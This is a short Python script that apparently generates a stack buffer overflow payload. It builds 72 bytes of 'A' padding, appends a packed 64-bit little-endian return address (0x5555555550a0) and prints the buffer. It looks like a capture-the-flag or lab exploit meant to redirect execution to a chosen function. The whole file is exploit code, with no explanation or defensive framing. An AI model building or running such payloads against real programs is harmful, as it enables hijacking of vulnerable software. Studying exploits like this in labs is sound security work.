#!/usr/bin/env python 
from struct import * 
 
buf = b"" 
buf += b"A"*72
buf += pack("<Q", 0x5555555550a0) 
print(buf)
